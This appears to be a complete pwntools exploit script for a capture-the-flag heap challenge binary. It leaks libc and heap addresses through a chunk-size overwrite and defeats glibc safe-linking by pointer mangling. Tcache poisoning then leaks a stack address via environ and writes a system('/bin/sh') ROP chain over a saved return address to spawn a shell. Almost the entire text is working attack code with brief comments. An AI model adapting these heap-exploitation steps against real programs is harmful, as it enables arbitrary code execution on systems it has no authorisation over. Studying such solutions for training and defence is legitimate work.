from pwn import *
elf = context.binary = ELF("./chal")
libc = ELF("./libc.so.6")                                                                                                                                                                                                                    
ld = ELF("./ld-linux-x86-64.so.2")
p = process(elf.path)

def mangle(pos, ptr):
    return (pos >> 12) ^ ptr

def malloc(size, content):
    p.sendlineafter(b">", b"1")
    p.sendlineafter(b">", size)
    p.sendafter(b">", content)

def view(idx, buffer):
    p.sendlineafter(b">", b"2")
    p.sendlineafter(b">", idx)
    p.sendlineafter(b">", b"1")
    p.recvuntil(b"Here it is! Your self-decorated cell!")
    p.recvline()
    if buffer is None:
        data = p.recvline()
        return data
    p.recvuntil(buffer)
    data = p.recv(6)
    return data

def edit(idx, new_content):
    p.sendlineafter(b">", b"2")
    p.sendlineafter(b">", idx)
    p.sendlineafter(b">", b"2")
    p.sendafter(b">", new_content)

def heap_leak():
    p.sendlineafter(b">", b"1337")
    p.recvuntil(b"Do what you will with this:")
    heap_leak = int(p.recvline().decode().strip(), 16)
    return heap_leak



# get libc and heap leak
heap_leak = heap_leak()
malloc(b"32", b"A"*32 + b"B"*8 + p64(0xd21))
malloc(b"3400", b"blablabla")
edit(b"0", b"A"*48)


leak = view(b"0", b"A"*48)
libc_leak = u64(leak.ljust(8, b'\x00'))
libc.address = libc_leak - 0x203ac0 - 0x60
heap_base = heap_leak - 0x2a0

#"reset" heap
edit(b"0",  b"A"*32 + b"B"*8 + p64(0xd01))
malloc(b"3320", b"bruh")

# perform tcache poisoning #1 to get a stack leak using environ
edit(b"1", b"A"*3400 + p64(0x2b1))
malloc(b"700", "ah s***, here we go again")
# we repeat this process, we need 2 tcache chunks for tcache poisoning.
# currently top chunk size is shifted by 4 bytes, so we malloc to reset everything
# Also, we need to page align it to 0x1000 bytes, our closest is 0xc58 bytes, so we need to "bridge" to there
# Oh and also, we need to link the pointers, so the tcache bin size has to be 0x290
malloc(b"2672", b"alignment issues ffs")
edit(b"4", b"A"*2672 + p64(0x0) + p64(0x2b1))
malloc(b"700", b"into the tcache we go")

curr_chunk = heap_base + 0x43d50
target = libc.symbols['environ'] - 0x18
m_po = mangle(curr_chunk, target)

edit(b"4", b"A"*2672 + p64(0x0)+p64(0x2b1) + p64(m_po))
malloc(b"640", b'junk')

malloc(b"640", b"A"*24)
raw_leak = view(b"7", None)
stack_addr_raw = raw_leak[24:24+6]
stack_leak = u64(stack_addr_raw.ljust(8, b"\x00"))

# overwrite saved rip when we exit to get shell
# tcache poisoning again
ret_addr = stack_leak - 304
edit(b"5", b"A"*712 + p64(0xd31))
malloc(b"3000", b"bruh")
malloc(b"400", b"tcache no.1")
edit(b"9", b"A"*0x198 + p64(0xe61))
malloc(b"3300", b"math moment")
malloc(b"400", b"tcache no.2")

# now do the overwrite
system_ptr = libc.symbols['system']
bin_sh_ptr = next(libc.search(b"/bin/sh"))
pop_rdi = libc.address + 0x000000000010f78b
ret = libc.address + 0x000000000002882f

edit(b"10", b"A"*0xcf0+ p64(mangle(heap_base+0x87ea0, ret_addr-0x8)))
malloc(b"320", b"junk")
malloc(b"320", b"A"*8 + p64(pop_rdi) + p64(bin_sh_ptr) + p64(ret) + p64(system_ptr))
p.sendlineafter(b">", b"a")
p.interactive()


